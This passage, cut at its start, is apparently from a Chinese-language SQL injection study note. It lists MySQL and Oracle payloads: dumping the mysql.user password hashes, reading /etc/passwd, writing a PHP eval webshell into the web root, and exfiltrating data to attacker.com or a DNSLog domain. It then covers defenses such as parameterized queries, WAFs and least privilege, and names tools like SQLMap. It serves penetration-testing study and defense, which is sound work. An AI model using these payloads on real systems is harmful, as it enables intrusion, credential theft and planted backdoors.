    *   指定表所有列名: `SELECT column_name FROM information_schema.columns WHERE table_schema='数据库名' AND table_name='表名'`
    *   获取数据: `SELECT concat_ws(':', col1, col2) FROM 库名.表名 LIMIT 0,1`
    *   合并多行: `SELECT group_concat(username separator ', ') FROM users`
*   **获取用户密码 (需要读取 `mysql` 库权限):**
    *   MySQL < 5.7: `SELECT user, password FROM mysql.user`
    *   MySQL >= 5.7: `SELECT user, authentication_string FROM mysql.user`
*   **文件读写 (需要 `FILE` 权限):**
    *   **读取文件:**
        ```sql
        ' UNION SELECT load_file('/etc/passwd') --+  -- Linux
        ' UNION SELECT load_file('C:/Windows/win.ini') --+ -- Windows
        ```
        *   受 `secure_file_priv` 全局变量限制:
            *   `NULL`: 禁止任何 `load_file`, `outfile`, `dumpfile` 操作。
            *   `""` (空字符串): 无限制 (不安全)。
            *   `/path/to/dir/`: 只允许在指定目录下读写。
            *   可以通过 `SELECT @@secure_file_priv;` 查看当前设置。
    *   **写入WebShell:**
        ```sql
        -- 使用 INTO OUTFILE (会在末尾加换行, 适合文本文件)
        ' UNION SELECT "<?php @eval($_POST['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php' --+
        -- 使用 INTO DUMPFILE (写入原始二进制数据, 适合写小文件或二进制文件)
        ' UNION SELECT 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E INTO DUMPFILE 'C:/xampp/htdocs/shell.php' --+ (Hex编码的PHP一句话)
        ```
        *   需要知道Web服务器的绝对路径。
        *   MySQL进程运行的用户需要对目标目录有写入权限。
        *   受 `secure_file_priv` 限制。
*   **查找Web路径方法:**
    *   利用应用程序报错信息。
    *   利用phpinfo()等探针页面。
    *   读取常见配置文件 (需 `load_file` 权限):
        *   Apache: `httpd.conf`, `apache2.conf`, `.htaccess`
        *   Nginx: `nginx.conf`, `sites-available/default`
        *   PHP: `php.ini` (查找 `doc_root`)
        *   Web应用自身配置文件 (如 `wp-config.php`)
    *   暴力猜解常见路径 (`/var/www/html`, `/usr/share/nginx/html`, `C:/inetpub/wwwroot`, `C:/xampp/htdocs`)。
    *   利用报错注入或盲注读取配置文件内容。

#### Oracle数据库注入

*   **特点:** 语法与其他数据库差异较大。有强大的内置包 (Packages) 可用于各种操作，包括网络访问 (`UTL_HTTP`, `UTL_TCP`, `UTL_INADDR`, `UTL_DNS`) 和文件操作 (`UTL_FILE`)。信息获取通常通过 `DUAL` 表和数据字典视图 (`ALL_TABLES`, `ALL_TAB_COLUMNS`, `V$VERSION`等)。
*   **信息获取:**
    *   版本: `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`
    *   当前用户: `SELECT user FROM dual;`
    *   所有用户: `SELECT username FROM all_users;`
    *   所有表: `SELECT table_name FROM all_tables;`
    *   指定表列名: `SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME_IN_UPPERCASE';` (注意Oracle默认对象名为大写)
*   **OOB (带外通道) 利用:** (需要相应包的执行权限)
    *   DNSLog: `SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.your.dnslog.domain') FROM dual;`
    *   HTTP 请求: `SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT user FROM dual)) FROM dual;`
    *   文件读写: 需要配置 `UTL_FILE_DIR` 参数并拥有 `UTL_FILE` 包权限。

### SQL注入防御

防御SQL注入需要综合运用多种策略：

1.  **代码层面 (首选):**
    *   **参数化查询 (Parameterized Queries / Prepared Statements):** **最有效、最推荐**的防御方法。将SQL代码模板与用户输入的数据分开处理。数据库驱动程序会确保用户输入被当作纯粹的数据处理，而不是SQL代码的一部分。
        *   **PHP (PDO):** `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id"); $stmt->execute(['id' => $userId]);`
        *   **Java (JDBC):** `PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); pstmt.setInt(1, userId); ResultSet rs = pstmt.executeQuery();`
        *   **Python (DB-API):** `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
    *   **ORM框架:** 大多数现代ORM（如Hibernate, SQLAlchemy, Django ORM, Eloquent）默认使用参数化查询。但需注意避免使用允许直接拼接字符串构建查询的API（如某些ORM提供的raw SQL执行接口，若使用也应参数化）。
    *   **输入验证与过滤:**
        *   **类型检查:** 确保输入符合预期的类型（如数字、日期、邮箱格式）。
        *   **白名单验证:** 只允许输入包含在预定义安全字符集或模式中的数据。例如，只允许字母和数字的用户名。
        *   **长度限制:** 限制输入的最大长度，防止超长输入可能导致的缓冲区问题或注入。
    *   **转义:** 作为**次要**或**补充**手段。对所有进入SQL语句的用户输入中的特殊字符（如 `'`, `"`, `\`, `%`, `_` 等，具体取决于数据库）进行转义。必须使用数据库或语言提供的、上下文安全的转义函数（如PHP的 `mysqli_real_escape_string()`，但必须配合 `mysqli_set_charset()`）。**强烈不推荐手动实现转义**。

2.  **网络层面:**
    *   **Web应用防火墙 (WAF):** 部署硬件或软件WAF，启用防SQL注入规则集。WAF可以基于签名、行为或机器学习检测并阻止许多已知的注入攻击模式。WAF是深度防御的一部分，**不应作为唯一的防护措施**。
    *   **云防护服务:** 使用阿里云盾、腾讯云WAF、Cloudflare等云服务提供商的安全防护功能。

3.  **数据库层面:**
    *   **最小权限原则:** Web应用连接数据库所使用的账户应只授予其执行业务逻辑所必需的最低权限。例如，只授予对特定表的 `SELECT`, `INSERT`, `UPDATE`, `DELETE` 权限，禁止 `DROP`, `ALTER`, 文件操作，以及对系统表、存储过程的访问权限。**绝对避免使用 `root`, `sa` 等高权限账户**连接数据库。
    *   **关闭或限制不必要的数据库功能:** 如非必需，禁用或严格限制 `xp_cmdshell` (MSSQL), `UTL_FILE` (Oracle), `load_file` (MySQL) 等高风险功能。
    *   **错误信息处理:** 不要在生产环境中向最终用户显示详细的数据库错误信息。配置应用程序返回通用的错误页面，并将详细错误记录在安全的服务器端日志中。

### 常用函数 (MySQL 参考)

*   **系统信息:** `version()`, `@@version`, `database()`, `schema()`, `user()`, `current_user()`, `system_user()`, `@@datadir`, `@@basedir`, `@@version_compile_os`, `sleep(seconds)`, `benchmark(count, expr)`
*   **字符串处理:** `concat(str1,...)`, `concat_ws(sep,str1,...)`, `group_concat(col)`, `length(str)`, `char_length(str)`, `substr(str,pos,len)`, `substring(...)`, `mid(...)`, `left(str,len)`, `right(str,len)`, `ascii(char)`, `ord(char)`, `char(n1,...)`, `hex(str)`, `unhex(hex_str)`, `load_file(filepath)`, `elt(N,str1,str2,...)`, `find_in_set(str,strlist)`
*   **逻辑与控制:** `if(cond, true_val, false_val)`, `ifnull(expr1, expr2)`, `nullif(expr1, expr2)`, `case when cond then res [...] else res end`, `strcmp(str1, str2)`
*   **数学:** `floor(num)`, `rand()`, `count(*)`, `max()`, `min()`, `avg()`

### SQL注入工具

自动化工具可以极大提高SQL注入检测和利用的效率：

*   **SQLMap:** (推荐) 开源、功能最强大、支持数据库种类最多的自动化SQL注入工具。支持各种注入技术（UNION, Error, Blind, OOB等）、数据库指纹识别、权限提升、文件系统访问、OS Shell等。
*   **SQLNinja:** 专注于 Microsoft SQL Server 的注入利用工具。
*   **JSQL Injection:** 用Java编写的跨平台SQL注入工具，支持多种数据库。
*   **BBQSQL:** 基于Python的盲注利用框架，尤其适用于复杂的盲注场景。
*   **Burp Suite (Scanner / Intruder):** 虽然是综合性Web安全工具，其Scanner可以自动检测SQL注入，Intruder模块可以辅助进行手动的盲注或定制化注入测试。

[[SQLMAP]]